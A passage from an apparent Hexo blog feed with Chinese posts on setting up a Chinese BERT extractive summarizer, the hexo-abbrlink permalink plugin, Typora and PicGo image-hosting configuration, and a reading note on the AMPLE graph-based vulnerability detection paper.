href="#搭建-bert-extractive-summarizer-环境" class="headerlink" title="搭建 bert-extractive-summarizer 环境"></a>搭建 bert-extractive-summarizer 环境</h2><p>首先从github上clone该项目</p><p>然后运行一个小demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line">body = <span class="string">&quot;This repo is the generalization of the lecture-summarizer repo. This tool utilizes the HuggingFace Pytorch transformers library to run extractive summarizations. This works by first embedding the sentences, then running a clustering algorithm, finding the sentences that are closest to the cluster&#x27;s centroids. This library also uses coreference techniques, utilizing the https://github.com/huggingface/neuralcoref library to resolve words in summaries that need more context. The greedyness of the neuralcoref library can be tweaked in the CoreferenceHandler class.As of the most recent version of bert-extractive-summarizer, by default, CUDA is used if a gpu is available.&quot;</span></span><br><span class="line">model = Summarizer()</span><br><span class="line">result = model(body, num_sentences=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>下载好相应的依赖后发现出现报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218101532243.png" alt="image-20231218101532243"></p><p>这里的报错原因在于：代码试图从Hugging Face模型存储库（<a href="https://huggingface.co)下载模型文件,但由于网站不稳定等原因无法连接到该服务器./">https://huggingface.co）下载模型文件，但由于网站不稳定等原因无法连接到该服务器。</a></p><blockquote><p>在使用Hugging Face Transformers库时（很多需要用到某些模型的机器学习库都是这样），如果你指定的模型没有在本地缓存中找到，库会尝试从Hugging Face模型存储库下载所需的模型文件，以便进行后续的模型初始化和使用。这是因为模型文件通常比较大，不方便直接包含在库中，因此在需要时会动态下载。</p></blockquote><p>因此这里我们选择手动下载模型</p><h2 id="手动下载中文模型"><a href="#手动下载中文模型" class="headerlink" title="手动下载中文模型"></a>手动下载中文模型</h2><p>Hugging Face Transformers库所使用的默认bert模型 bert-large-uncased 只可以用于英文语料，如果我们要将该项目应用在中文的摘要任务上需要稍作修改，使用一个中文的bert模型和一个中文的分词器。</p><p>首先我们<strong>手动下载中文的bert模型 bert-base-chinese</strong> </p><p>打开Hugging Face的官网搜索我们想要的模型<a href="https://huggingface.co/bert-base-chinese">bert-base-chinese</a>，点击files，下载下面红框内的四个文件，然后根据你使用的框架选择相应的模型文件，如果使用的是pytorch就下载pytorch_model.bin，如果是TensorFlow就换成tf_model.h5，这里我们使用的是pytorch，所以选择pytorch_model.bin进行下载。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218103610166.png" alt="image-20231218103610166"></p><p>将下载好的文件放在我们的项目目录下，比如我这里建立了一个bert-base-chinese文件夹存放：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231218104219354.png" alt="image-20231218104219354"></p><p>接下来将需要用到该模型的地方修改为我们本地的路径就可以了</p><h1 id="修改源代码"><a href="#修改源代码" class="headerlink" title="修改源代码"></a>修改源代码</h1><p>spacy默认使用英文分词，我们需要将其改成中文。</p><p>将 <code>bert-extractive-summarizer/summarizer/sentence_handler.py</code> 下的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.en <span class="keyword">import</span> English </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=English</span>):</span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> spacy.lang.zh <span class="keyword">import</span> Chinese</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, language=Chinese</span>):</span><br></pre></td></tr></table></figure><h1 id="测试模型"><a href="#测试模型" class="headerlink" title="测试模型"></a>测试模型</h1><p>在主目录下创建test.py测试模型，在这里我们使用的是自己手动下载的模型，使用<code>AutoConfig</code>、<code>AutoTokenizer</code>和<code>AutoModel</code>来加载bert-base-chinese&#x2F;目录下的模型和相关配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> summarizer <span class="keyword">import</span> Summarizer</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load model, model config and tokenizer via Transformers</span></span><br><span class="line">custom_config = AutoConfig.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_config.output_hidden_states=<span class="literal">True</span></span><br><span class="line">custom_tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>)</span><br><span class="line">custom_model = AutoModel.from_pretrained(<span class="string">&#x27;bert-base-chinese/&#x27;</span>, config=custom_config)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">body = <span class="string">&#x27;准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。灰色西装外套配上细框眼镜，高雄市副市长史哲，出席海事展剪彩活动，作为高雄近年艺文展演重要推手的他，如今传出可能接任文化部长，立委(民)赵天麟说：「史哲副市长有非常丰富的行政经历，在陈菊市长时代就被称为点子王，在陈其迈市长的时代里面，他更是把亚洲新湾区，变成了是一个国际非常知名的亮点，我相信可以把，这么成功的高雄经验南方经验，成为未来的台湾之光。」盘点史哲过去艺文经历，不但曾担任过高雄的新闻处长，文化局长等等，也曾操刀陈水扁的竞选广告，2009年世运会开幕典礼，筹画设计的三太子骑机车，一举让台湾跃上国际舞台，另外催生驳二和高雄总图，以及推出高雄春天艺术节，重办大港开唱等等，也都出自史哲之手，源源不绝的创意经验，堪称超级点子王。立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」虽然史哲并没证实即将入阁，不过原文化部长李永得，已经要转任政委，而目前文化部仍有公视法修法，和中正纪念堂转型两大关键政策，预计要在今年推动，究竟最终，是不是由史哲继续接手，未来文化部长的执行力，将成为检验内阁改组的重要指标。新闻来源：华视新闻&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model = Summarizer(custom_model=custom_model, custom_tokenizer=custom_tokenizer)</span><br><span class="line"><span class="built_in">print</span>(model(body, num_sentences=<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">准行政院长陈建仁，在公布原文化部长李永得将转任政务委员之后，传出将征询高雄市副市长史哲，出任文化部长。 被称为「点子王」的史哲，不但一手催生驳二和高雄总图，10几年来也不断扩展高雄的设计能量，像是高雄春天艺术节、重办大港开唱等等，史哲都是幕后重要推手，但目前文化部仍有公视法修法和中正纪念堂转型，两大关键政策预计要在今年推动，势必将成为检验内阁改组的重要指标。 立委(国)李德维说：「他过去长期是在民进党内参与政治活动，尤其是相关的学运以及工运，现在却因为担任高雄市的文化局长，就要升任文化部长，真的让人大失所望。」</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a href="https://blog.csdn.net/du_lun/article/details/129462104">https://blog.csdn.net/du_lun/article/details/129462104</a></li><li><a href="https://blog.csdn.net/m0_46295727/article/details/133221439">https://blog.csdn.net/m0_46295727/article/details/133221439</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bert </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『SEO优化』：Hexo-abbrlink插件生成hexo永久固定链接</title>
      <link href="/posts/1e78.html"/>
      <url>/posts/1e78.html</url>
      
        <content type="html"><![CDATA[<h1 id="hexo默认url格式存在的问题"><a href="#hexo默认url格式存在的问题" class="headerlink" title="hexo默认url格式存在的问题"></a>hexo默认url格式存在的问题</h1><p>Hexo在生成博客文章链接时，默认的静态URL格式是 <code>:year/:month/:day/:title</code>，也就是按照年、月、日、标题格式来生成固定链接的，如<code>http://xxx.yy.com/2020/07/06/hello-world</code>。</p><p><strong>这样的话就会存在一些问题：</strong></p><ul><li><p>如果你的标题是中文的话，你的URL链接就会包含中文，例如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204194948770.png" alt="image-20231204194948770"></p><p>这样的url路径复制后会将中文变成一大堆字符串编码：<a href="https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/">https://cnhuazhu.top/butterfly/2023/03/01/Flask/%E9%83%A8%E7%BD%B2Flask%E9%A1%B9%E7%9B%AE%E8%87%B3%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%9A%84Docker%E5%AE%B9%E5%99%A8%E5%86%85/</a> </p><p>如果你在其它地方用了你自己这篇文章的url链接，偶然你又修改了该文章的标题，那<strong>这个url链接就会失效</strong>。</p></li><li><p>这样的url格式中年月日都会有分隔符，生成的链接会成为一个四级目录，<strong>对于搜索引擎来说并不是很友好。</strong></p><blockquote><p>百度蜘蛛在抓取网页时遵循以下规则：</p><p>网页的抓取频率与其权重和信用度成正比，尤其是对网站的首页和内页。通常，蜘蛛首先抓取网站的首页，因为首页通常具有更高的权重，而且大多数链接都指向首页。然后，通过首页抓取网站的内页，但并非所有内页都会被蜘蛛抓取。</p><p>搜索引擎认为对于一般的中小型站点，3层结构足以包含所有内容，因此蜘蛛主要抓取前三层的内容。超过三层的内容被认为相对不重要，因此蜘蛛不会经常爬取这些内容。因此，在设计链接结构时，最好将permalink后面的层级控制在2个斜杠以内。</p></blockquote></li></ul><h1 id="hexo-abbrlink的安装配置"><a href="#hexo-abbrlink的安装配置" class="headerlink" title="hexo-abbrlink的安装配置"></a><strong>hexo-abbrlink的安装配置</strong></h1><p>为了解决上面提到的问题，我们使用Hexo的插件<strong>hexo-abbrlink</strong>，它能将 Hexo 生成的永久链接转化为一个固定的随机值，极大的缩短了永久链接的长度。一旦生成一个随机值，之后对文章的标题或者时间进行任何修改，这个随机的 abbrlink 是不会发生任何变化的，也为 Hexo 的维护提供了便利。</p><p>博客目录下执行命令安装：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$npm install hexo-abbrlink --save </span><br></pre></td></tr></table></figure><p>修改<code>_config.yml</code>文件中的配置项（记得把原来的<code>permalink:</code>删除掉）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#设置永久链接</span><br><span class="line">permalink: posts/:abbrlink.html  </span><br><span class="line">abbrlink:</span><br><span class="line">    alg: crc16   #算法： crc16(default) and crc32</span><br><span class="line">    rep: dec     #进制： dec(default) and hex</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><blockquote><p>参考文章<a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></p><p>在生成之前就要改好算法和形式。不然后面再改的话会导致链接不统一。我就踩过坑，但后来是一个文章一个文章删除<code>abbrlink:</code>的值才改过来的，还好我文章不是很多。</p><p>话说最近看到了Hexo-abbrlink2这个插件，可以从1.html开始编。</p><p>我试用了一下，会导致文章重复，正在研究如何解决。如果能从1开始编写的话，这样更容易看得出写了多少篇文章，当前上传和修改的是哪一篇。后面再研究。</p><p>PS：刚使用这个插件后，阅读人数和评论都会变为0，介意慎用！综上所述，这插件适合新站！</p></blockquote><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>侵权删：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/112318081">https://zhuanlan.zhihu.com/p/112318081</a></li><li><a href="https://zhuanlan.zhihu.com/p/169492685">https://zhuanlan.zhihu.com/p/169492685</a></li><li><a href="https://cloud.tencent.com/developer/article/1936315">https://cloud.tencent.com/developer/article/1936315</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『typora』相关配置与体验优化</title>
      <link href="/posts/c91a.html"/>
      <url>/posts/c91a.html</url>
      
        <content type="html"><![CDATA[<p>本文主要介绍typora配置过程中的一些<strong>问题的解决方法</strong>以及<strong>优化体验方案</strong>。</p><h1 id="版本过期报错"><a href="#版本过期报错" class="headerlink" title="版本过期报错"></a>版本过期报错</h1><p>下载完成后如果出现版本过期的报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20231204191844101.png" alt="image-20231204191844101"></p><p>具体解决方法参考：<a href="https://blog.csdn.net/wagnteng/article/details/126585618">https://blog.csdn.net/wagnteng/article/details/126585618</a></p><h1 id="设置右键菜单新建md"><a href="#设置右键菜单新建md" class="headerlink" title="设置右键菜单新建md"></a>设置右键菜单新建md</h1><p>任意位置创建一个txt文件，后缀改为reg</p><p>文件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md]</span><br><span class="line">@=&quot;Typora.md&quot;</span><br><span class="line">&quot;Content Type&quot;=&quot;text/markdown&quot;</span><br><span class="line">&quot;PerceivedType&quot;=&quot;text&quot;</span><br><span class="line"> </span><br><span class="line">[HKEY_CLASSES_ROOT\.md\ShellNew]</span><br><span class="line">&quot;NullFile&quot;=&quot;&quot;</span><br></pre></td></tr></table></figure><p>完成后运行，运行完成后可以删除掉该文件</p><h1 id="图床配置：阿里云-PicGo-Core-command-line"><a href="#图床配置：阿里云-PicGo-Core-command-line" class="headerlink" title="图床配置：阿里云 + PicGo Core (command line)"></a>图床配置：阿里云 + PicGo Core (command line)</h1><p>Typora是一个跨平台的markdown编辑器，使用markdown编辑器写文章优点是排版简洁，痛点则是无法像Word那样直接嵌入图片，插入的图片实际上插入的是图片的路径（可以是本地路径也可以是网络路径），默认情况下为本地路径，这种情况下的md文档在别的终端上打开会无法查看图片。</p><p><strong>我们可以自己配置图床构建网络路径，来实现md文档的跨平台跨设备浏览</strong></p><p>下面介绍这里采用阿里云 + PicGo Core (command line)的方法来对图床进行配置的方法：</p><p><strong>1. PicGo Core (command line)下载与配置</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716132921821.png" alt="image-20230716132921821"></p><p>下载完成后打开找到文件夹 <code>C:\Users\用户名\AppData\Roaming\Typora\picgo\win64\</code> ，在对应文件夹下cmd执行 <code>./.config/Typora/picgo/linux/picgo install gitee-uploader</code>，若执行失败需要去安装nodejs环境</p><blockquote><p>nodejs安装教程：<a href="https://blog.csdn.net/zimeng303/article/details/112167688">https://blog.csdn.net/zimeng303/article/details/112167688</a></p></blockquote><p>完成后打开配置文件</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/348e3092fc111d18984bd35b197a3357.png" alt="image-20200620214326041"></p><p>文件内容修改如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;picBed&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;uploader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aliyun&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;aliyun&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;accessKeyId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;accessKeySecret&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bucket&quot;</span><span class="punctuation">:</span> <span class="string">&quot;isodatop&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储空间名</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oss-cn-beijing&quot;</span><span class="punctuation">,</span> <span class="comment">// 存储区域代号</span></span><br><span class="line">      <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;img/&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义存储路径</span></span><br><span class="line">      <span class="attr">&quot;customUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://isodatop.oss-cn-beijing.aliyuncs.com&quot;</span><span class="punctuation">,</span> <span class="comment">// 自定义域名，注意要加 http://或者 https://</span></span><br><span class="line">      <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span> <span class="comment">// 针对图片的一些后缀处理参数 PicGo 2.2.0+ PicGo-Core 1.4.0+</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;picgoPlugins&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;picgo-plugin-gitee-uploader&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>accesskeyid与secret的获取：</strong></p><p>登录阿里云，进入控制台，可以在里面查看这两个字段</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170158751.png" alt="image-20230716170158751"></p></li><li><p><strong>bucket、area、customUrl的获取</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170626283.png" alt="image-20230716170626283"></p><p>再点击进入bucket，bucket名称即为isodatop</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170714631.png" alt="image-20230716170714631"></p><p>点击概览</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716170833593.png" alt="image-20230716170833593"></p><p>这里的②为<code>oss-cn-beijing.aliyuncs.com</code>，注意要去掉后面的<code>.aliyuncs.com</code>，将<code>oss-cn-beijing</code>填入area字段</p><p>③为<code>isodatop.oss-cn-beijing.aliyuncs.com</code>，添加上<code>https://</code>后填入 customUrl 字段</p><p><strong>2. 测试</strong></p><p>配置完成后打开typora的偏好设置，验证上传服务是否配置成功</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171455885.png" alt="image-20230716171455885"></p><p>出现如下界面则上传成功：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20230716171616617.png" alt="image-20230716171616617"></p><blockquote><p><strong>如果出现报错或者上传成功但是图片在typora里面不予显示的情况</strong>：</p><p>注意检查前面几个字段是否按照要求进行了删除与添加相应的字段</p></blockquote></li></ul><h1 id="优化体验设置"><a href="#优化体验设置" class="headerlink" title="优化体验设置"></a>优化体验设置</h1><ul><li>文本高亮：<a href="https://blog.csdn.net/weixin_40626630/article/details/111405928">https://blog.csdn.net/weixin_40626630/article/details/111405928</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 资源工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『论文笔记』Vulnerability Detection with Graph Simplification and Enhanced Graph Representation Learning</title>
      <link href="/posts/c91a.html"/>
      <url>/posts/c91a.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>原文标题：Vulnerability Detection with Graph Simplification and Enhanced Graph Representation Learning</em><br><em>原文作者：Xin-Cheng Wen; Yupan Chen; Cuiyun Gao; Cuiyun Gao; Jie M. Zhang</em><br><em>发表期刊：International Conference on Software Engineering (ICSE) 2023</em><br><em>原文链接：<a href="https://arxiv.org/pdf/2302.04675">https://arxiv.org/pdf/2302.04675</a></em><br><em>主题类型：源代码漏洞检测，深度学习</em><br><em>笔记作者：isoda</em><br><em>主编：黄诚@安全学术圈</em></p></blockquote><h1 id="1、研究介绍"><a href="#1、研究介绍" class="headerlink" title="1、研究介绍"></a>1、研究介绍</h1><p>图神经网络（GNN）已经被证明了在学习源代码的图表示方面的有效性，并且经常应用于现有的基于深度学习的漏洞检测方法中。然而，GNN仍然受到以下事实限制：</p><ul><li>因为专注于通过邻域聚合来学习节点的局部特征，GNN <strong>很难处理代码结构图中长距离节点之间的连接依赖</strong>，无法捕获图的全局信息。</li><li><strong>不能很好地利用代码结构图中的多种边类型</strong>（如表示数据流和控制流的边）。</li></ul><p>为了缓解这一问题，本文提出了一种新的漏洞检测框架AMPLE，主要包括图简化和增强的图表示学习两部分：<strong>1）图简化</strong>。通过缩小代码结构图的节点大小来减少节点之间的距离，使得GNN更容易处理长距离节点间的依赖关系； <strong>2）增强图表示学习</strong>。通过一个边感知图卷积网络模块将异构边信息融合到节点表示中，提高节点表示的准确性。并通过一个核尺度表示模块更好捕获远距离节点之间的关系，提升全局信息的学习效果。实验结果表明，AMPLE在准确性和F1分数方面显著优于现有方法，证明了其在捕捉代码图全局信息和提高漏洞检测效果方面的有效性。</p><h1 id="2、主要思路"><a href="#2、主要思路" class="headerlink" title="2、主要思路"></a>2、主要思路</h1><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611110609958.png" alt="image-20240611110609958"></p><p>AMPLE整体的流程图如上所示，框架总体来说分为图简化和增强图表示学习两个部分：首先从源代码中提取代码结构图，输入图简化模块，进行基于节点类型和变量类型的图简化；将简化完成后的代码结构图输入增强表示学习模块，通过边感知图卷积网络提取整个图的边增强节点表示矩阵，再通过双尺度卷积核来学习图的全局信息，最后通过两个全连接层和一个softmax函数进行二分类，判断源代码中是否存在漏洞。</p><h2 id="2-1、图简化"><a href="#2-1、图简化" class="headerlink" title="2.1、图简化"></a>2.1、图简化</h2><p>图简化部分旨在压缩代码结构图中的重复信息，从而缩小图的大小并减少节点之间的距离。该部分主要包括两个步骤：基于节点类型的图简化和基于节点变量的图简化。</p><ul><li><p><strong>基于节点类型的图简化</strong>：通过解析原则和手动检查代码结构图，作者提出了七条合并规则，如表1所示。对于每一对符合合并规则的相邻节点，删除子节点，因为其信息是父节点的细化，并且可以在后续节点中反映。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611113827591.png" alt="image-20240611113827591"></p><p>例如，下图中 <code>char *first = malloc(10)</code>  语句是一个标识符声明语句，红色虚线边框的节点就是作为它的子节点可以按照表中的规则2合并到其父节点。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611162758364.png" alt="image-20240611162758364"></p></li><li><p><strong>基于变量的图简化</strong>：将代码结构图中具有相同变量的叶子节点合并为一个节点，使得合并后的节点有多个父节点，可以同时聚合来自不同语句的信息。增强了节点表示的丰富性和准确性的同时并不会改变其父子层次信息。</p><p>例如下图中，“char str[15]”和“scanf(”%s”,str);”两个语句的子节点中都存在变量“str”，从而可以合并两个“str”叶节点，“scanf(”%s”,str);”将新的AST边连接合并后的“str”叶节点。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611163124981.png" alt="image-20240611163124981"></p></li></ul><h2 id="2-2、增强图表示学习"><a href="#2-2、增强图表示学习" class="headerlink" title="2.2、增强图表示学习"></a>2.2、增强图表示学习</h2><p>该部分主要包括两个模块：边感知图卷积网络模块和核尺度表示模块。</p><ul><li><p><strong>边感知图卷积网络</strong>（edge-aware graph convolutional network，EA-GCN）模块：为了利用简化图中的不同边类型（如抽象语法树AST和控制流图CFG）来增强节点表示，作者提出了EA-GCN。</p><p>首先对代码结构图中所有节点的嵌入向量进行初始化。将节点中的代码标记为token序列，基于word2vec初始化每个token的嵌入，计算节点中所有token嵌入的平均值，作为整个节点的初始嵌入。</p><p>然后在消息传递过程中，分别对不同类型的边加权计算节点向量。进一步引入多头注意力机制整合图中的异构边信息，计算并聚合节点边的注意力分数，以增强节点表示。 最终可以计算得到整个图的<strong>边增强节点表示矩阵</strong>。</p></li><li><p><strong>核尺度表示模块</strong>：核尺度表示模块旨在通过显式捕捉远距离节点之间的关系来学习图的全局信息。</p><p>该模块设计了双尺度卷积核，其中大卷积核关注于远距离节点之间的关系，小卷积核关注于邻居节点之间的关系，两个卷积核并行进行卷积操作。两个分支的卷积结果经过批归一化（BN）层处理后相加，将最终的结果通过两个全连接层和一个softmax函数进行二分类，判断源代码中是否存在漏洞。</p></li></ul><h2 id="2-3、实验设置"><a href="#2-3、实验设置" class="headerlink" title="2.3、实验设置"></a>2.3、实验设置</h2><p>使用了三个广泛研究的开源C&#x2F;C++项目基准数据集</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611152606586.png" alt="image-20240611152606586"></p><p>作者将AMPLE与三种基于图和三种基于令牌的SOTA漏洞检测方法分别在选用的所有数据集上进行了比较，可以看到AMPLE基本是全面优于基线模型的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240611152752272.png" alt="image-20240611152752272"></p><h1 id="3、个人思考"><a href="#3、个人思考" class="headerlink" title="3、个人思考"></a>3、个人思考</h1><ul><li>AMPLE围绕基于GNN进行漏洞检测的两大问题展开：1）难以处理代码结构图中长距离节点之间的连接依赖。2）不能很好地利用代码结构图中的多种边类型。作者分别设计了核尺度表示模块和边感知图卷积网络模块来解决这两大问题，模型整体在F1方面相比SOTA模型有显著的提高，论文思路条理十分清晰。</li><li>尽管图简化方法减少了节点数量，但增强图表示学习模块（EA-GCN和核尺度表示模块）的<strong>计算复杂度</strong>仍然较高，特别是在处理大型代码库时，可能面临计算资源和时间的挑战。</li><li>虽然在基准数据集上表现优异，但这些基准数据集均为C&#x2F;C++数据集，<strong>在其他类型编程语言上的泛化能力</strong>仍需进一步验证和优化。</li><li>论文中的方法通过二分类来判断代码片段是否存在漏洞，检测粒度在函数级别和模块&#x2F;类级别，<strong>不能实现漏洞的精确定位</strong>。在实际应用中，还需要结合其他技术手段来实现漏洞的精确定位和修复。未来工作可以考虑如何将此方法与精确定位技术结合，提供更全面的漏洞检测和修复方案。</li></ul><h1 id="论文团队信息"><a href="#论文团队信息" class="headerlink" title="论文团队信息"></a>论文团队信息</h1><p>通讯作者高翠芸，哈尔滨工业大学（深圳）计算机学院终身副教授、博导，学校青年拔尖人才，香港中文大学（CUHK）博士，深圳市“海外高层次人才”，鹏城实验室双聘学者，获得第九届中国科协青年人才托举工程项目。</p><ul><li>主要研究方向：人工智能+软件工程，大语言模型；漏洞检测</li><li>70+篇论文发表在程序分析和软件工程领域的顶级会议和期刊上，如TSE、TOSEM、ICSE、 ISSTA、ASE等。</li><li>个人主页：<a href="https://cuiyungao.github.io/">https://cuiyungao.github.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 论文笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源代码漏洞检测 </tag>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Git』Git使用教程</title>
      <link href="/posts/b860.html"/>
      <url>/posts/b860.html</url>
      
